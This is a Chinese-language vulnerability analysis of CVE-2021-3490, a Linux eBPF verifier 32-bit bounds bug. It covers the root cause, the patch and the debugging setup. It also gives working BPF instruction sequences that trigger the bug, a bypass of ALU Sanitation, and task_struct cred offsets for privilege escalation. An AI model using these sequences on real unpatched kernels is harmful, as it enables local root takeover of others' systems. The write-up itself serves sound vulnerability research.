> 原文链接: https://www.anquanke.com//post/id/251933 


# CVE-2021-3490 eBPF 32位边界计算错误漏洞利用分析


                                阅读量   
                                **22127**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01741ddcc0e7bdfb60.jpg)](https://p2.ssl.qhimg.com/t01741ddcc0e7bdfb60.jpg)



**影响版本**：Linux 5.7-rc1以后，Linux 5.13-rc4 以前； v5.13-rc4已修补，v5.13-rc3未修补。 评分7.8分。

**测试版本**：Linux-5.11 和 Linux-5.11.16 [exploit及测试环境下载地址](https://github.com/bsauce/kernel-exploit-factory)—[https://github.com/bsauce/kernel-exploit-factory](https://github.com/bsauce/kernel-exploit-factory)

**编译选项**：`CONFIG_BPF_SYSCALL`，config所有带BPF字样的。 **CONFIG_SLAB=y**

`General setup` —-&gt; `Choose SLAB allocator (SLUB (Unqueued Allocator))` —-&gt; `SLAB`

在编译时将`.config`中的`CONFIG_E1000`和`CONFIG_E1000E`，变更为=y。[参考](https://blog.csdn.net/qq_16097611/article/details/104965045)

```
$ wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v4.x/linux-5.11.16.tar.xz
$ tar -xvf linux-5.11.16.tar.xz
# KASAN: 设置 make menuconfig 设置"Kernel hacking" -&gt;"Memory Debugging" -&gt; "KASan: runtime memory debugger"。
$ make -j32
$ make all
$ make modules
# 编译出的bzImage目录：/arch/x86/boot/bzImage。
```

**漏洞描述**：Linux内核中按位操作（AND、OR 和 XOR）的 eBPF ALU32 边界跟踪没有正确更新 32 位边界，造成 Linux 内核中的越界读取和写入，从而导致任意代码执行。三个漏洞函数分别是 [scalar32_min_max_and()](https://elixir.bootlin.com/linux/v5.13-rc3/source/kernel/bpf/verifier.c#L7078) 、[scalar32_min_max_or()](https://elixir.bootlin.com/linux/v5.13-rc3/source/kernel/bpf/verifier.c#L7149)、[scalar32_min_max_xor()](https://elixir.bootlin.com/linux/v5.13-rc3/source/kernel/bpf/verifier.c#L7219)。`AND/OR` 是在 Linux 5.7-rc1 中引入，`XOR` 是在 Linux 5.10-rc1中引入。

**补丁**：[patch](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e) 若低32位都为 known，则调用 [__mark_reg32_known()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1053)，将32位边界设置为reg的低32位（常数），保证最后更新边界时，有正确的边界。

```
diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 757476c91c984..9352a1b7de2dd 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -7084,11 +7084,10 @@ static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,
     s32 smin_val = src_reg-&gt;s32_min_value;
     u32 umax_val = src_reg-&gt;u32_max_value;

-    /* Assuming scalar64_min_max_and will be called so its safe
-     * to skip updating register for known 32-bit case.
-     */
-    if (src_known &amp;&amp; dst_known)
+    if (src_known &amp;&amp; dst_known) `{`
+        __mark_reg32_known(dst_reg, var32_off.value);
         return;
+    `}`

     /* We get our minimum from the var_off, since that's inherently
      * bitwise.  Our maximum is the minimum of the operands' maxima.
@@ -7108,7 +7107,6 @@ static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,
         dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;
         dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;
     `}`
-
 `}`*/

static void __mark_reg32_known(struct bpf_reg_state *reg, u64 imm)
`{`
    reg-&gt;var_off = tnum_const_subreg(reg-&gt;var_off, imm);
    reg-&gt;s32_min_value = (s32)imm;
    reg-&gt;s32_max_value = (s32)imm;
    reg-&gt;u32_min_value = (u32)imm;
    reg-&gt;u32_max_value = (u32)imm;
`}`
```

**保护机制**：开启KASLR/SMEP/SMAP。

**利用总结**：利用verifier阶段与runtime执行阶段的不一致性，进行越界读写。泄露内核基址、伪造函数表、实现任意读写后篡改本线程的cred。

## 1. 漏洞分析

**参考**：BPF介绍和相似漏洞分析，可参考[CVE-2020-8835利用](https://blog.csdn.net/panhewu9919/article/details/117736484)，里面也有`var_off` 也即`tnum`结构的含义。总之，其成员 `value` 表示确定的值，`mask` 对应的位是1则表示该位不确定。

**漏洞根源**：eBPF指令集可以对64位寄存器或低32位进行操作，`verifier`也会对低32位进行范围追踪：``{`u,s`}`32_`{`min,max`}`_value`。每次进行指令操作，有两个函数会分别更新64位和32位的边界，在 [adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) 中调用这两个函数。很多BPF漏洞都出现在对32位边界的处理上。CVE-2021-3490也出现在32位运算 `BPF_AND`、`BPF_OR`、`BPF_XOR` 中。

#### <a class="reference-link" name="1-1%20%E4%BB%A3%E7%A0%81%E8%B7%9F%E8%B8%AA"></a>1-1 代码跟踪

**漏洞调用链**：[adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) -&gt; [scalar32_min_max_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L6534)

```
*
/* WARNING: This function does calculations on 64-bit values, but  * the actual execution may occur on 32-bit values. Therefore,      * things like bitshifts need extra checks in the 32-bit case.
*/
static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
                                      struct bpf_insn *insn,
                                      struct bpf_reg_state 
                                                  *dst_reg,
                                      struct bpf_reg_state src_reg)
`{`
...
        case BPF_AND:
                dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off,       
                src_reg.var_off);
                scalar32_min_max_and(dst_reg, &amp;src_reg);    // [1] &lt;--- 漏洞点
                scalar_min_max_and(dst_reg, &amp;src_reg);
                break;
        case BPF_OR:
                dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off,  
                src_reg.var_off);
                scalar32_min_max_or(dst_reg, &amp;src_reg);        // &lt;--- 漏洞点
                scalar_min_max_or(dst_reg, &amp;src_reg);
                break;
        case BPF_XOR:
                dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off,   
                src_reg.var_off);
                scalar32_min_max_xor(dst_reg, &amp;src_reg);    // &lt;--- 漏洞点
                scalar_min_max_xor(dst_reg, &amp;src_reg);
                break;

...
    __update_reg_bounds(dst_reg);                            // [2]
    __reg_deduce_bounds(dst_reg);
    __reg_bound_offset(dst_reg);
    return 0;
`}`
```

**`[1]`**： 对比32位和64位的`BPF_AND`操作。低32位 `BPF_AND` 中，若 `src_reg` 和 `dst_reg` 都为 known，则不用更新32位的边界（开发者假设，反正之后还是会调用 [scalar_min_max_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L6570) -&gt; [__mark_reg_known()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1045) 来标记寄存器的，所以暂时不用处理），直接返回。64位 `BPF_AND` 中，若 `src_reg` 和 `dst_reg` 都为 known，则调用 [__mark_reg_known()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1045) 将寄存器标记为 known。

**问题**：[scalar32_min_max_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L6534) 32位中，`*_known` 变量是调用 [tnum_subreg_is_const()](https://elixir.bootlin.com/linux/v5.12.3/source/include/linux/tnum.h#L96) 来计算的，而 [scalar_min_max_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L6570) 64位中是调用 [tnum_is_const()](https://elixir.bootlin.com/linux/v5.12.3/source/include/linux/tnum.h#L54) 来计算的。区别是，前者只判断低32位的 `tnum-&gt;mask` 来判断是否为 known，后者则判断整个64位是否为 known。如果某个寄存器的高32位不确定，而低32位是确定的，则 [scalar_min_max_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L6570) 也不会调用 [__mark_reg_known()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1045) 来标记寄存器。

```
static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,
                                 struct bpf_reg_state *src_reg)
`{`
    bool src_known = tnum_subreg_is_const(src_reg-&gt;var_off);
    bool dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);
    struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);
    s32 smin_val = src_reg-&gt;s32_min_value;
    u32 umax_val = src_reg-&gt;u32_max_value;


    /* Assuming scalar64_min_max_and will be called so its safe
    * to skip updating register for known 32-bit case.   开发者假设，反正之后还是会调用scalar_min_max_and() -&gt; __mark_reg_known() 来标记寄存器的，所以暂时不用处理，直接返回。但是如果某个寄存器的高32位不确定，而低32位是确定的，则 scalar_min_max_and() 不会调用 __mark_reg_known()。
    */
    if (src_known &amp;&amp; dst_known)
        return;
...
`}`

static void scalar_min_max_and(struct bpf_reg_state *dst_reg,
                              struct bpf_reg_state *src_reg)
`{`
    bool src_known = tnum_is_const(src_reg-&gt;var_off);
    bool dst_known = tnum_is_const(dst_reg-&gt;var_off);
    s64 smin_val = src_reg-&gt;smin_value;
    u64 umin_val = src_reg-&gt;umin_value;

    if (src_known &amp;&amp; dst_known) `{`
            __mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);
            return;
    `}`
  ...
`}`
```

**`[2]`**：接着 [adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) 会调用以下三个函数来更新 `dst_reg` 寄存器的边界。每个函数都包含32位和64位的处理部分，我们这里只关心32位的处理部分。reg 的边界是根据当前边界和 `reg-&gt;var_off` 来计算的。

```
// __update_reg32_bounds() —— min边界是取 min`{`当前min边界、reg确定的值`}`，会变大；max边界是取 max`{`当前max边界，reg确定的值`}`，会变小。
static void __update_reg32_bounds(struct bpf_reg_state *reg)
`{`
    struct tnum var32_off = tnum_subreg(reg-&gt;var_off);

    /* min signed is max(sign bit) | min(other bits) */
    reg-&gt;s32_min_value = max_t(s32, reg-&gt;s32_min_value,
                               var32_off.value | (var32_off.mask &amp; 
                               S32_MIN));

     /* max signed is min(sign bit) | max(other bits) */
     reg-&gt;s32_max_value = min_t(s32, reg-&gt;s32_max_value,
                                var32_off.value | (var32_off.mask &amp; 
                                S32_MAX));
     reg-&gt;u32_min_value = max_t(u32, reg-&gt;u32_min_value,
                               (u32)var32_off.value);
     reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,
                             (u32)(var32_off.value |
                              var32_off.mask));
`}`
// __reg32_deduce_bounds() —— 接着用符号和无符号边界来互相更新
/* Uses signed min/max values to inform unsigned, and vice-versa */
static void __reg32_deduce_bounds(struct bpf_reg_state *reg)
`{`
    /* Learn sign from signed bounds.
     * If we cannot cross the sign boundary, then signed and
     * unsigned bounds
     * are the same, so combine.  This works even in the
     * negative case, e.g.
     * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.
     */
    if (reg-&gt;s32_min_value &gt;= 0 || reg-&gt;s32_max_value &lt; 0) `{`
            reg-&gt;s32_min_value = reg-&gt;u32_min_value =
                        max_t(u32, reg-&gt;s32_min_value, 
                        reg-&gt;u32_min_value);
                reg-&gt;s32_max_value = reg-&gt;u32_max_value =
                        min_t(u32, reg-&gt;s32_max_value, 
                        reg-&gt;u32_max_value);
                return;
    `}`
...
`}`
// __reg_bound_offset() —— 最后，用无符号边界来更新 var_off
static void __reg_bound_offset(struct bpf_reg_state *reg)
`{`
    struct tnum var64_off = tnum_intersect(reg-&gt;var_off,    // tnum_intersect() —— 组合两个tnum参数
                            tnum_range(reg-&gt;umin_value,        // tnum_range() —— 返回一个tnum，表示给定范围内，所有可能的值。
                                       reg-&gt;umax_value));                
    struct tnum var32_off = tnum_intersect(tnum_subreg(reg-&gt;var_off),tnum_range(reg-&gt;u32_min_value, reg-&gt;u32_max_value));

    reg-&gt;var_off = tnum_or(tnum_clear_subreg(var64_off), 
                                             var32_off);
`}`
```

#### <a class="reference-link" name="1-2%20%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"></a>1-2 触发漏洞

**BPF代码示例**：例如指令`BPF_ALU64_REG(BPF_AND, R2, R3)`，对 R2 和 R3 进行与操作，并保存到 R2。
<li>
`R2-&gt;var_off = `{`mask = 0xFFFFFFFF00000000; value = 0x1`}``，表示R2低32位已知为1，高32位未知。由于低32位已知，所以其32位边界也为1。</li>
<li>
`R3-&gt;var_off = `{`mask = 0x0; value = 0x100000002`}``，表示其整个64位都已知，为 `0x100000002`。</li>
更新R2的32位边界的步骤如下：
<li>先调用 [adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) -&gt; [tnum_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/tnum.c#L86) 对 `R2-&gt;var_off` 和 `R3-&gt;var_off` 进行AND操作，并保存到 `R2-&gt;var_off`。**结果 `R2-&gt;var_off = `{`mask = 0x100000000; value = 0x0`}``**，由于R3是确定的且R2高32位不确定，所以运算后，只有第32位是不确定的。
<pre><code class="lang-c hljs cpp">struct tnum tnum_and(struct tnum a, struct tnum b)
`{`
    u64 alpha, beta, v;

    alpha = a.value | a.mask;
    beta = b.value | b.mask;
    v = a.value &amp; b.value;
    return TNUM(v, alpha &amp; beta &amp; ~v);
`}`
</code></pre>
</li>
- 再调用 [adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) -&gt; [scalar32_min_max_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L6534)，会直接返回，因为R2和R3的低32位都已知。
- 再调用 [adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) -&gt; [__update_reg_bounds()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1217) -&gt; [__update_reg32_bounds()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1189) ，会设置 `u32_max_value = 0`，因为 **`var_off.value = 0 &lt; u32_max_value = 1`**。同时，设置 `u32_min_value = 1`，因为 `var_off.value = 0 &lt; u32_min_value`。带符号边界也一样。
<li>
[__reg32_deduce_bounds()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1224) 和 [__reg_bound_offset()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1299) 对边界不作任何改变。最后得到寄存器 R2 — ``{`u,s`}`32_max_value = 0 &lt; `{`u,s`}`32_min_value = 1`。</li>
#### <a class="reference-link" name="1-3%20%E8%B0%83%E8%AF%95BPF%E7%9A%84%E6%96%B9%E6%B3%95"></a>1-3 调试BPF的方法

**写和调试BPF程序**：可使用[rbpf](https://github.com/qmonnet/rbpf)。

**verifier 日志输出**：加载BPF程序时进行如下设置，即可在`verifier`检测出指令错误时输出指令信息。正常调试时，可以下源码断点，断在`do_check()` 函数中，具体观察 `verifier` 检查每条指令时寄存器的状态。

```
char verifier_log_buff[0x200000] = `{`0`}`;        // 这段缓冲区必须足够大，否则会出错
union bpf_attr prog_attrs =
`{`
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = cnt,
    .insns = (uint64_t)insn,
    .license = (uint64_t)"",
    .log_level = 2,                            // 设置为 1 时，就能输出简洁的指令信息
    .log_size = sizeof(verifier_log_buff),
    .log_buf = verifier_log_buff
`}`;
// 输出示例
34: (bf) r6 = r3
35: R0_w=invP0 R2_w=map_value(id=0,off=0,ks=4,vs=4919,imm=0) R3_w=map_value(id=0,off=0,ks=4,vs=4919,imm=0) R4_w=invP0 R5_w=invP4294967298 R6_w=map_value(id=0,off=0,ks=4,vs=4919,imm=0) R7_w=invP(id=0) R10=fp0 fp-8=mmmm????
35: (7b) *(u64 *)(r2 +8) = r6
R6 leaks addr into map
```

**runtime调试**：如果BPF通过了`verifier`检查，如何获取BPF程序运行时的信息呢？答案是插桩。`ALU Sanitation`也是运行时检查指令执行情况的保护机制，可以通过插桩观察BPF指令是否已经改变。这里需要了解一个编译选项，编译时设置`CONFIG_BPF_JIT`，则BPF程序在verifier验证后是JIT及时编译的；如果不设置该选项，则采用eBPF解释器来解码并执行BPF程序，代码位于`kernel/bpf/core.c:___bpf_prog_run()`。

`regs`指向寄存器值，`insn`指向指令。为了获取每条指令执行时的寄存器状态，可以关闭`CONFIG_BPF_JIT`选项并插入`printk`语句。示例如下：

```
static u64 ___bpf_prog_run(u64 *regs, const struct bpf_insn *insn)
`{`
...
    int lol = 0;

   // Check the first instruction to match the first instruction of  
   // the target eBPF program to debug, so output isn't printed for  
   // every eBPF program that is ran. 只打印部分指令的信息
    if(insn-&gt;code == 0xb7)
    `{`
        lol = 1;
    `}`


select_insn:
        if(lol)
        `{`
            printk("instruction is: %0x\n", insn-&gt;code);
            printk("r0: %llx, r1: %llx, r2: %llx\n", regs[0], 
            regs[1], regs[2]);
            ...
        `}`
        goto *jumptable[insn-&gt;code];
...
`}`
```

## 2. 漏洞利用 Linux v5.11.7 及以前版本

**特点**：我们采用`Linux v5.11` 版本的内核进行测试，特点是不需要绕过一种ALU Sanitation，之后我们会详细介绍。

**总目标**：构造 `r6` 寄存器，使得 `verifier` 认为 `r6` 等于0，但实际执行时等于1。

#### <a class="reference-link" name="2-1%20%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"></a>2-1 触发漏洞

首先，我们需要构造出两个寄存器的值状态，分别为`var_off = `{`mask = 0xFFFFFFFF00000000; value = 0x1`}`` 和 `var_off = `{`mask = 0x0; value = 0x100000002`}``。然后触发漏洞，得到 `r6` 的 `u32_max_value = 0 &lt; u32_min_value = 1`。

**注意**：实际从map传入的 `r5 = r6 = 0`。

```
// (1) 构造 r6: var_off = `{`mask = 0xFFFFFFFF00000000; value = 0x1`}`
        BPF_MAP_GET(0, BPF_REG_5),                        // (79) r5 = *(u64 *)(r0 +0) 从MAP传入值，这样其 mask=0xffffffffffffffff
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_5),            // (bf) r6 = r5

        BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF),            // (18) r2 = 0xffffffff
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),            // (67) r2 &lt;&lt;= 32         0xFFFFFFFF00000000
        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_2),    // (5f) r6 &amp;= r2  高32位unknown, 低32位known为0
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),            // (07) r6 += 1  `{`mask = 0xFFFFFFFF00000000, value = 0x1`}`

// (2) 构造 r2: var_off = `{`mask = 0x0; value = 0x100000002`}`
        BPF_LD_IMM64(BPF_REG_2, 0x1),                    // (18) r2 = 0x1
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),            // (67) r2 &lt;&lt;= 32         0x10000 0000
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 2),            // (07) r2 += 2  `{`mask = 0x0; value = 0x100000002`}`

// (3) trigger the vulnerability
        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_8),     // (5f) r6 &amp;= r2         r6: u32_min_value=1, u32_max_value=0
```

#### <a class="reference-link" name="2-2%20%E6%9E%84%E9%80%A0%20verifier:0%20tuntime:1"></a>2-2 构造 verifier:0 tuntime:1

```
// (4) 构造 r5 (r5也是MAP载入的值——0): u32_min_value = 0, u32_max_value = 1, var_off = `{`mask = 0xFFFFFFFF00000001; value = 0x0`}`
        BPF_JMP32_IMM(BPF_JLE, BPF_REG_5, 1, 1),        // (b6) if w5 &lt;= 0x1 goto pc+1   r5: u32_min_value = 0, u32_max_value = 1, var_off = `{`mask = 0xFFFFFFFF00000001; value = 0x0`}`
        BPF_EXIT_INSN(),
// (5) 构造 r6:   verifier:0  tuntime:1
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),            // (07) r6 += 1         r6: u32_max_value = 1, u32_min_value = 2, var_off = `{`0x100000000; value = 0x1`}`
        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_5),    // (0f) r6 += r5   r6: verify:2   fact:1   !!!!!!!!!!!!!!!!!!!!!!!
        BPF_MOV32_REG(BPF_REG_6, BPF_REG_6),            // (bc) w6 = w6    32位扩展为64位
        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1),            // (57) r6 &amp;= 1       r6: verify:0   fact:1
```

**r6 += r5分析**：目前寄存器状态，r6—`u32_min_value=2, u32_max_value=1, var_off = `{`mask = 0x100000000; value = 0x1`}``，r5—`u32_min_value=0, u32_max_value=1, var_off = `{`mask = 0xFFFFFFFF00000001; value = 0x0`}``。

```
static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
                                      struct bpf_insn *insn,
                                      struct bpf_reg_state 
                                             *dst_reg,
                                      struct bpf_reg_state src_reg)
`{`
  ...
    switch (opcode) `{`
        case BPF_ADD:
            scalar32_min_max_add(dst_reg, &amp;src_reg);        // [1] &lt;---------
            scalar_min_max_add(dst_reg, &amp;src_reg);
            dst_reg-&gt;var_off = tnum_add(dst_reg-&gt;var_off, 
                                        src_reg.var_off);
            break;

...
    __update_reg_bounds(dst_reg);                            // [2]
    __reg_deduce_bounds(dst_reg);                            // [3]
    __reg_bound_offset(dst_reg);                            // [4]
    return 0;
`}`
// [1] 由于r5的低32位是0或1，r6的低32位是1，所以相加结果为1或2，所以低32位的1、2位都为unknown。其mask=0xffffffff 00000003
static void scalar32_min_max_add(struct bpf_reg_state *dst_reg,
                                 struct bpf_reg_state *src_reg)
`{`
    s32 smin_val = src_reg-&gt;s32_min_value;
    s32 smax_val = src_reg-&gt;s32_max_value;
    u32 umin_val = src_reg-&gt;u32_min_value;
    u32 umax_val = src_reg-&gt;u32_max_value;

...
    if (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||
        dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) `{`        // 判断是否越界
            dst_reg-&gt;u32_min_value = 0;
            dst_reg-&gt;u32_max_value = U32_MAX;
        `}` else `{`
            dst_reg-&gt;u32_min_value += umin_val;                // 没越界则直接相加，min+min, max+max
            dst_reg-&gt;u32_max_value += umax_val;
        `}`
`}`
```

接着 `adjust_scalar_min_max_vals()` 会调用 `__update_reg_bounds()`、`__reg_deduce_bounds()`、`__reg_bound_offset()`。
<li>
`__update_reg32_bounds()`中，`var_off` 表示低32位，`reg-&gt;u32_min_value = max`{`2, 0`}` = 2`，`reg-&gt;u32_max_value = min`{`2, 0 | 0x3`}` = 2`（`var32_off.mask = 3`）。</li>
<li>
`__reg32_deduce_bounds()` 未做修改，因为 `signed 32` 和 `unsigned 32`都相等。</li>
<li>
`__reg32_deduce_bounds()` 中，`tnum_range()`返回常数2（因为`u32_min_value = u32_max_value=2`该范围内只有2），由于`reg-&gt;var_off.mask = 0x3`，所以 `tnum_intersect()` 返回低2位是 known且为2。</li>
最终得到 `r6: `{`u,s`}`32_min_value = `{`u,s`}`32_max_value = 2, var_off = `{`mask = 0xFFFFFFFF00000000; value = 0x2`}``。

```
// [2] __update_reg32_bounds()
reg-&gt;u32_min_value = max_t(u32, reg-&gt;u32_min_value,
                          (u32)var32_off.value);
reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,
                         (u32)(var32_off.value | var32_off.mask));    // var32_off.mask=0x3
// [4] __reg32_deduce_bounds()
struct tnum var32_off = tnum_intersect(tnum_subreg(reg-&gt;var_off),    // tnum_subreg取低32位
                                     tnum_range(reg-&gt;u32_min_value, // 根据min、max返回一个tnum结构
                                     reg-&gt;u32_max_value));
struct tnum tnum_intersect(struct tnum a, struct tnum b)
`{`
    u64 v, mu;

    v = a.value | b.value;                                            // 简单的整合
    mu = a.mask &amp; b.mask;
    return TNUM(v &amp; ~mu, mu);
`}`
```

此时的 r6—``{`mask = 0xFFFFFFFF00000000; value = 0x2`}`  verifier:2 runtime:1`，只需取低32位并 `AND 1`，即可得到 `verifier:0 runtime:1`。

#### <a class="reference-link" name="2-3%20%E6%8F%90%E6%9D%83"></a>2-3 提权

后面的利用步骤和CVE-2021-31440一样，参照 [CVE-2021-31440 eBPF边界计算错误漏洞](https://bsauce.github.io/2021/06/09/CVE-2021-31440/) 的exp即可提权。

## 3. 漏洞利用 Linux v5.11.8 – 5.11.16 版本

**特点**：我们采用 `Linux v5.11.16` 版本的内核进行测试，Ubuntu 21.04就是这个版本。2021年3月修复了一个`verifier`计算`alu_limit`（与`ALU Sanitation`安全机制有关）时的整数溢出漏洞——[commit 10d2bb2e6b1d8c](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899)，导致 `Linux 5.11.8 - 5.11.16` 这个版本区间的内核无法利用成功。当`alu_limit = 0`时会触发该漏洞，例如，当对map地址指针进行减法操作时（之前exp这么写，是为了构造越界访问，如泄露内核基址，或者修改map内存之前的 `bpf_map` 结构），会加入如下sanitation指令：`0-1` 将得到 `aux→alu_limit = 0xFFFFFFFF`。

```
*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - 1);
```

这个漏洞的存在，导致`ALU Sanitation`机制失效了，因为 `alu_limit` 变得很大了，检测不到越界访问，所以之前那些公开的exp都能利用成功。但是这个漏洞被修复以后，就需要绕过这个限制，需要多加5条指令来绕过该机制。

**绕过该ALU Sanitation**：`r7`指向map，`r6`是`verifier`以为是0而运行时为1的那个值。需要在r7指针进行运算前，使`alu_limit != 0`。
- （1）`r8 = r6` 先拷贝一下—— `r8  verifier:0  runtime:1`。
- （2）`r7 += 0x1000`，map指针加上一个常量，以设置`alu_limit=0x1000`，这样就能绕过运行时的`ALU Sanitation`。
- （3）`r8 = r8 * 0xfff`—— `r8 verifier:0  runtime:0xfff`。
- （4）`r7 -= r8`， 由于`verifier`以为r8等于0，所以`alu_limit`保持不变。
- （5）`r7 -= r6` —— `r7 verifier:map+0x1000  runtime:map`。
**注意**：
<li>创建map时必须足够大，调用`syscall(__NR_BPF, BPF_MAP_CREATE, ...)`时第3个参数 `bpf_attr-&gt;value_size`要大于0x1000，不然执行第2条指令时就会报指针越界的错误。
<pre><code class="lang-c hljs cpp">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),                     // 1-1. (bf) r8 = r6  BPF_REG_3 = BPF_REG_6   !!! 1-1 -&gt; 1-5  是为了绕过alu_limit的限制
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),                // 1-2. (07) r7 += 0x1000                !!! 注意，map不能过小，小于0x1000 就报错
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0xfff),                // 1-3. verifier: r8=0;    runtime: r8=0x1000-1
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),            // 1-4. r7 -= r8
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),             // 1-5. r7 -= r6
</code></pre>
</li>
<li>和`Linux v5.11` 版本相比，还需要修改cred search的相关偏移：
<pre><code class="lang-bash hljs">gef➤  p/x &amp;(*(struct task_struct *)0)-&gt;pid
$9 = 0x918
gef➤  p/x &amp;(*(struct task_struct *)0)-&gt;cred
$10 = 0xad8
gef➤  p/x &amp;(*(struct task_struct *)0)-&gt;tasks
$11 = 0x818
</code></pre>
</li>
## 4. 漏洞利用 Linux v5.11.16以后的版本

**特点**：目前无法绕过最新的`ALU Sanitation`保护机制。2021年4月`ALU Sanitation`引入新的 patch—[commit 7fedb63a8307](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0)，新增了两个特性。
- 一是`alu_limit`计算方法变了，不再用指针寄存器的位置来计算，而是使用offset寄存器。例如，假设有个寄存器的无符号边界是 `umax_value = 1, umin_value = 0`，则计算出 `alu_limit = 1`，表示如果该寄存器在运行时超出边界，则指针运算不会使用该寄存器。
<li>二是在runtime时会用立即数替换掉 `verifier` 认定为常数的寄存器。例如，`BPF_ALU64_REG(BPF_ADD, BPF_REG_2, EXPLOIT_REG)` ，`EXPLOIT_REG`被verifier认定为0，但运行时为1，则 将该指令改为 `BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0)`。这个补丁本来是为了防侧信道攻击，同时也阻止了 `CVE-2021-3490` 漏洞的利用。
<pre><code class="lang-c hljs cpp">// 以下补丁可看出，如果不确定offset寄存器是否为常量，则根据其alu_limit进行检查；如果确定其为常量，则用其常量值将其操作patch为立即数指令。
bool off_is_imm = tnum_is_const(off_reg-&gt;var_off);
alu_state |= off_is_imm ? BPF_ALU_IMMEDIATE : 0;
isimm = aux-&gt;alu_state &amp; BPF_ALU_IMMEDIATE;
...
if (isimm) `{`
        *patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit);
    `}` else `{`
         // Patch alu_limit check instructions
         ....
     `}`
</code></pre>
</li>
检查发现，v5.11.17 已打该补丁，v5.11.16 未打该补丁。所以 **v5.11.16 以上版本的内核就无法利用漏洞进行越界读写**，不知道以后能不能绕过这个限制。

## 5. ALU Sanitation机制

